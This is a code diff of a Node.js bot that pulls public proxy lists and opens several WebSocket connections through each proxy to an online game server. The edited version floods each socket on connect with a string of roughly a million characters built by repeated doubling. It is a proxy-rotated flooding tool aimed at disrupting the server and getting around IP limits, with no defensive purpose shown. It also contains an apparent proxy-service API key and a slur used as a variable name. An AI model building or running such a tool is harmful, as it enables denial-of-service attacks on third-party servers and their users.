@@ -60,13 +60,13 @@ const HttpsProxyAgent = require('https-proxy-agent');
 
 var proxies = [],
     connectedIPs = [];
-const curl = ["https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt", "https://api.proxylist.to/http?key=PROXY-D716A931-LIST-5A137343-TO", ]
+const curl = ["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "https://api.proxylist.to/http?key=PROXY-D716A931-LIST-5A137343-TO", ]
 
 function generateProxies() {
     if (false) {
         fetch("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc").then((res1) => res1.json().then((res2) => assignInstances(res2)))
     } else {
-       request(curl[1], function(error, response, body) {
+       request(curl[0], function(error, response, body) {
         if (!error && response.statusCode == 200) {
             proxies = body.trim().split("\n").map((proxy) => `http://${proxy}`);
             assignInstances(null);
@@ -85,21 +85,26 @@ function assignInstances(res) {
     for (let ipIndex = 0, l = proxies.length; ipIndex < l; ipIndex++) {
         const proxy = res == null ? proxies[ipIndex] : "http://" + proxies[ipIndex].ip + ":" + proxies[ipIndex].port, 
             options = url.parse(proxy),
-            endpoint = process.argv[2] || "wss://r1fx7d.territorial.io/s52/";
+            endpoint = process.argv[2] || "wss://bettertt.fearlessgames.de/next";
         var proxyObj = {
             index: ipIndex,
             ip: proxy,
             //npfp3p, zpb5n9, r1fx7d, ttio/i32
             socket1: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)}),
-            socket2: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)})/*,
+            socket2: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)}),
             socket3: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)}),
-            socket4: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)}),*/
+            socket4: new WebSocket(endpoint, { agent: new HttpsProxyAgent(options)}),/**/
         };
         
         for (var socket of [proxyObj.socket1, proxyObj.socket2/*, proxyObj.socket3, proxyObj.socket4*/]) {
             socket.on('open', function () {
                 console.log(proxyObj.index + "Open")
-                this.send(new Uint8Array([16, 41, 159, 231, 215, 82, 144, 158, 102, 216, 41, 204, 39, 133, 226, 88, 128, 44, 8, 130, 136, 0, 10, 2, 96, 192]));
+                var gay = "􏿽"
+                for (let i = 0; i < 20; i++) {
+                    gay += gay;
+                }
+                this.send(gay)
+                //this.send(new Uint8Array([16, 41, 159, 231, 215, 82, 144, 158, 102, 216, 41, 204, 39, 133, 226, 88, 128, 44, 8, 130, 136, 0, 10, 2, 96, 192]));
             });
             socket.on('close', function () {
                 connectedIPs = connectedIPs.filter(obj => obj.index != proxyObj.index)
